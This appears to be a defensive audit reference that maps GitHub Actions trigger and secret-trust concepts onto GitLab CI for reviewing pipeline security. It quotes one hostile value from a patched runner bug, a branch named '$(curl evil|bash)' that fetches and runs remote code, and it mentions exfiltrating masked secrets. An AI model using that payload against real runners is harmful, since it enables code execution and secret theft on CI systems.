# GitLab CI Trigger Semantics (for the source→sink method)

This reference translates the GitHub Actions vocabulary in `ci-audit-triggers/SKILL.md`
(and the hardening side, `ci-harden-workflow`) into GitLab CI's real equivalents. The
**method** (classify trigger trust → enumerate attacker-controlled inputs → trace the
ref/code the job operates on → hunt injection → audit secret reach → check the cheap
hardening) is identical on both platforms — only the vocabulary changes. Load this
instead of, not in addition to, the GitHub-specific body when `ci_platform.sh` reports
`gitlab-ci`.

**Read this first — the trust model is architecturally different, not just
relabeled.** GitHub's model is a *runtime check* on an otherwise-automatic trigger
(`author_association` gates an `if:` that fires on every push/comment). GitLab's model
is *structural*: a fork-submitted merge request's pipeline runs in the **fork
project's own context by default** (no parent secrets, fork's own runners) and never
touches the parent project's protected variables unless a **parent-project member with
at least the Developer role manually clicks "Run pipeline" and accepts a warning**.
There is no analog to `pull_request_target` silently auto-running with base-repo
secrets on every fork push — that requires a deliberate, permissioned, human action
each time. Where GitHub gates *who typed the trigger phrase*, GitLab gates *who has
role-based access to the secret-holding project/branch*. Don't force GitHub's
runtime-check shape onto GitLab's role/protection-based shape — audit for the real
mechanism below.

## Mapping table

| GitHub Actions concept | GitLab CI equivalent | Confidence / caveat |
|---|---|---|
| `pull_request_target` (auto-runs on base repo w/ secrets on every fork push) | **No auto-run analog.** Fork MR pipelines run in the **fork's own context** by default (no parent secrets). Getting parent-context execution requires a parent-project Developer+ member to click **"Run pipeline"** and accept a warning, per MR, manually. See "Pipelines for merge requests from forks" below. | High — directly stated in GitLab docs (see Sources). |
| `issue_comment` / comment-triggered workflow | **No native equivalent.** `.gitlab-ci.yml` has no comment-triggered event. ChatOps-style "comment to trigger" requires an external webhook receiver that consumes GitLab's Note webhook event and calls the Pipeline Trigger API — the trust decision lives entirely **outside** the CI YAML, in whatever code processes that webhook. | High that no native trigger exists (docs + GitLab's own tracked feature request confirm it); the webhook-receiver code is project-specific, so audit it directly rather than assuming a pattern. |
| `${{ github.event.* }}` template/expression injection | `$[[ inputs.input-id \| function ]]` — CI/CD **Components/pipeline inputs** interpolation. This is the real analog: like `${{ }}`, it is substituted into the YAML **at pipeline-compile time**, before any shell runs, so it can rewrite pipeline structure (job names, `rules:`, `image:`), not just a string value. | High for the compile-time-substitution mechanism (GitLab docs describe it explicitly); see the important **distinction** below for predefined variables like `CI_MERGE_REQUEST_TITLE`, which do *not* work this way. |
| `author_association ∈ {OWNER, MEMBER, COLLABORATOR}` gate | **No runtime author-association check exists.** The real mechanism is structural: (a) **protected variables** are only injected into jobs running on protected branches/tags; (b) **protected branches** restrict push/merge access, and MR pipelines can only reach protected resources when the triggering user has push/merge access to the *target* branch; (c) running a fork MR's pipeline in the parent project requires the triggering user to hold the **Developer role in the parent project** — external fork-only contributors structurally cannot do this themselves. | High for the protected-variable/branch mechanism (official docs + security guides agree); medium on exact role-check wording for the "run pipeline in parent" action — GitLab's own docs state "you might need additional permissions if the branch is protected" without a single canonical sentence, so verify the exact role required in your GitLab version before treating this as precise. |
| Fork `head.ref` checkout (attacker code executes with base-repo secrets) | `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` (plus `CI_MERGE_REQUEST_SOURCE_PROJECT_ID`/`_PATH`/`_URL` to detect a fork — compare `SOURCE_PROJECT_ID` to `CI_MERGE_REQUEST_PROJECT_ID`; there is **no dedicated "is this a fork" variable**). The pwn-request precondition (secret-bearing job operating on fork-controlled code) is structurally harder to reach by default — see the trust-model note above — but once a maintainer *does* elevate a fork MR to parent context, the same pwn-request logic applies: any secret-bearing step touching that fork branch's tree is the same high-severity finding. | High. |
| `secrets.*` exposure / permissions scoping | **Protected variables** (opt-in per-variable flag, restricts injection to protected branches/tags) + **protected branches** (who can push/merge/unlock those variables). Log-level redaction is a separate, weaker control called **masking** — treat it as a safety net, not a boundary; a malicious job step can still base64-encode or exfiltrate a masked value via artifact/network egress. | High. |
| Third-party action pinned to a full commit SHA | **CI/CD components**: pin `include: component:` (and any `include: project:`/external template) to a **full commit SHA** (preferred) or an immutable release tag from the component catalog — not a moving ref like `~latest` or a branch name. | High (explicit official guidance). |
| GitHub Environments "required reviewers" gate | **Protected environments** with required approvals (`Settings > CI/CD > Protected environments`) — blocks all jobs deploying to that environment until the configured approvers sign off. | High. |

## Details

### Fork-submitted MR pipelines and "pipelines for merged results"

Two distinct GitLab concepts are easy to conflate — keep them separate when auditing:

- **Merge request pipelines** run against the source branch's commit alone.
- **Pipelines for merged results** run against an *internal, ephemeral merge commit* of
  source + target (closer to what will actually land), and must be explicitly enabled
  under `Settings > Merge requests > Merge options`.

Neither of these, by itself, is the fork-secrets risk. The risk is specifically about
**where** the pipeline executes for a fork-submitted MR:

- **Default:** the pipeline for a fork-submitted MR is created and runs **in the fork
  project**, using the fork's own runners, its own `.gitlab-ci.yml`, and its own
  project-level CI/CD variables. It never sees the parent (target) project's secrets.
- **Elevated:** a parent-project member with at least the **Developer role** can open
  the MR's Pipelines tab and select **"Run pipeline"**, which runs the pipeline **in the
  parent project's context** instead — parent runners, parent protected
  variables/settings — against fork-authored code. GitLab shows a warning ("this
  merge request contains code from a fork... could contain malicious code") that a
  human must read and accept in the UI before this fires. (This UI warning is
  reportedly bypassable via direct API calls or the `/rebase` quick action, so don't
  treat the warning itself as the security boundary — the Developer-role requirement is
  the real one.)

**Audit implication:** for a GitLab repo, "is this workflow pwn-request-vulnerable"
mostly reduces to "does this project have `Settings > CI/CD > Allow pipelines
triggered by merge requests from forked projects to run in the parent project` (or
equivalent) enabled, and if so, who holds Developer+ access — because that population
is the actual trust boundary, not any per-job `if:` condition."

### `CI_MERGE_REQUEST_*` variables and which are attacker-controlled

Full reference: GitLab's predefined CI/CD variables docs (linked below). The subset an
MR author (including a fork contributor) directly controls:

- `CI_MERGE_REQUEST_TITLE`
- `CI_MERGE_REQUEST_DESCRIPTION` (truncated at 2700 chars)
- `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`

`CI_MERGE_REQUEST_LABELS` is attacker-*influenceable* only if the project lets
non-members set labels; treat it as project-member-controlled, not
attacker-controlled, unless you've confirmed otherwise. There is no
`CI_MERGE_REQUEST_IS_FORK`-style variable — infer fork origin by comparing
`CI_MERGE_REQUEST_SOURCE_PROJECT_ID` to `CI_MERGE_REQUEST_PROJECT_ID` (they differ for
a fork).

### Injection: `$[[ inputs.* ]]` vs. an unquoted `$CI_MERGE_REQUEST_TITLE` — these are NOT the same severity

This is the nuance most likely to be over- or under-claimed, so it's worth being
precise:

1. **`$[[ inputs.input-id ]]`** (CI/CD Components/pipeline inputs) is interpolated
   into the pipeline YAML **at compile time**, before any job runs — genuinely the same
   class of risk as GitHub's `${{ }}`: an attacker-influenceable input used this way
   can rewrite `rules:`, job names, or images, not just supply a string. GitLab
   restricts interpolation to a small set of predefined functions (max 3 chained) as a
   mitigation, but a raw, unsanitized attacker-controlled value flowing into
   `$[[ inputs.x ]]` inside a `script:` line is still the injection to flag.
2. **Predefined variables** like `CI_MERGE_REQUEST_TITLE` are different: GitLab injects
   them as real **environment variables at job runtime**, not as compile-time YAML
   text substitution. This means the *default* risk from using
   `echo $CI_MERGE_REQUEST_TITLE` unquoted in a `script:` line is the classic
   shellcheck **SC2086** class — word-splitting and glob expansion of the value — not
   the "attacker's `"` or backtick breaks out of the script and runs arbitrary
   commands" class that inline `${{ }}` produces on GitHub. Unquoted shell parameter
   expansion does not, by itself, re-execute embedded shell metacharacters
   (`;`, `` ` ``, `$(...)`) in the value — those stay inert text inside the
   word-split tokens. GitLab's own guidance is still "always quote CI/CD variables,"
   and there's real precedent for why: a **now-patched** GitLab Runner bug
   (`gitlab-runner#27386`) double-quoted a branch name when building its own internal
   `git fetch` refspec command, which let a fork branch literally named
   `$(curl evil|bash)` command-inject on the runner — proof that "just a runtime env
   var" can still become executable if something downstream re-parses it unsafely
   (a re-interpreting sink: `eval`, a Makefile, a git-ref consumer, a second YAML/JSON
   parse). **Flag the sink, not just the unquoted variable** — an unquoted
   `CI_MERGE_REQUEST_TITLE` in a plain `echo` is low severity; the same value flowing
   into `eval`, a constructed git/docker command, or a re-parsed config file is high
   severity, matching the source→sink method already used for GitHub.

### Secrets exposure: protected variables + protected branches

GitLab's equivalent to "narrow the gate or move the secret behind an environment" is:

- Mark the CI/CD variable **Protected** — it is then injected only into jobs running
  on protected branches or protected tags, full stop. This is enforced at the
  injection layer, not by an `if:` a job author could get wrong.
- Protected branches also gate who can push/merge/force-unlock — so "protected
  variable" and "protected branch" work together as one control, not two independent
  ones.
- **Masking** (log redaction, replacing the value with `[MASKED]` in job output) is
  orthogonal and weaker — it stops accidental log leakage, not a deliberate
  exfiltration by malicious job code. Don't credit masking as a secrecy boundary in a
  finding.

### `issue_comment` / ChatOps: outside the CI YAML entirely

GitLab has no built-in `.gitlab-ci.yml` trigger for "someone commented on this MR/issue."
Teams that want that behavior wire it up externally: a GitLab **webhook** (the Note
event) fires to some external receiver, and that receiver — custom code, not GitLab —
decides whether to call the **Pipeline Trigger API** with a trigger token. If a
project uses this pattern, the audit target shifts: the trust gate to read is the
webhook receiver's own authentication/authorization logic (does it check the
commenter's real permission level before firing the trigger token?), not anything in
`.gitlab-ci.yml`. If you can't find that receiver's source, say so explicitly rather
than asserting the gate is sound or unsound.

### Hardening-side quick reference (for `ci-harden-workflow`)

- **SHA-pin the equivalent of a third-party action:** pin `include: component:` (or any
  external `include: project:`) to a full commit SHA or an immutable release tag from
  the component catalog, not a moving ref.
- **Required-reviewer gate on a privileged run:** use a **protected environment** with
  required approvals — deployments/jobs targeting it block until approved.
- **CODEOWNERS-equivalent for the control file:** GitLab supports a native
  `CODEOWNERS` file too (`Settings > Repository > Protected branches` +
  `CODEOWNERS` entries), so this one maps directly — protect
  `.gitlab-ci.yml` and any allowlist file the pipeline reads the same way you would on
  GitHub.

## What this reference does not cover (flagged, not guessed)

- **`workflow_run`-style "privileged pipeline triggered by an unprivileged pipeline's
  completion"** was not researched deeply enough for this doc to assert a specific
  GitLab equivalent (parent-child pipelines and `CI_JOB_TOKEN`-based multi-project
  triggers are the closest surface area). If auditing that specific pattern, research
  it directly rather than relying on this doc.
- The exact role/permission required to click "Run pipeline" on a fork MR may vary by
  GitLab version/tier (SaaS vs. self-managed, Free vs. Premium/Ultimate) — the docs
  fetched for this reference state Developer role in the parent project plus
  "additional permissions if the branch is protected" without fully enumerating the
  matrix. Verify against the target instance's actual GitLab version before treating
  this as exact.

## Sources

- [Merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) — fork pipeline
  default context, "Run pipeline" elevation, Developer-role requirement, malicious-fork-code warning.
- [Merged results pipelines](https://docs.gitlab.com/ci/pipelines/merged_results_pipelines/) — merged-results
  vs. plain MR pipeline distinction.
- [Predefined CI/CD variables reference](https://docs.gitlab.com/ci/variables/predefined_variables/) — full
  `CI_MERGE_REQUEST_*` variable list.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/) — protected/masked variable semantics, quoting
  guidance.
- [CI Protected Variables (GitLab runbooks)](https://runbooks.gitlab.com/ci/protected-variables/) —
  protection-vs-masking distinction.
- [CI/CD inputs](https://docs.gitlab.com/ci/inputs/) — `$[[ inputs.input-id ]]` compile-time interpolation,
  restricted function set.
- [Protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/) and
  [Roles and permissions](https://docs.gitlab.com/user/permissions/) — push/merge access as the real trust
  gate.
- [Protected environments](https://docs.gitlab.com/ci/environments/protected_environments/) and
  [Deployment approvals](https://docs.gitlab.com/ci/environments/deployment_approvals/) — required-reviewer
  equivalent.
- [CI/CD components](https://docs.gitlab.com/ci/components/) and
  [Pipeline security](https://docs.gitlab.com/ci/pipeline_security/) — SHA/release pinning guidance for
  `include:`.
- [Webhook events](https://docs.gitlab.com/user/project/integrations/webhook_events/) and
  [Trigger pipelines with the API](https://docs.gitlab.com/ci/triggers/) — comment/note webhook + external
  trigger-token pattern (no native comment-trigger event).
- [gitlab-runner#27386 "Command injection via branch name in CI
  pipelines"](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27386) — patched runner-internals bug
  demonstrating a real (non-hypothetical) fork-branch-name injection path, and why it differs from the
  general "unquoted script variable" (SC2086) risk class.
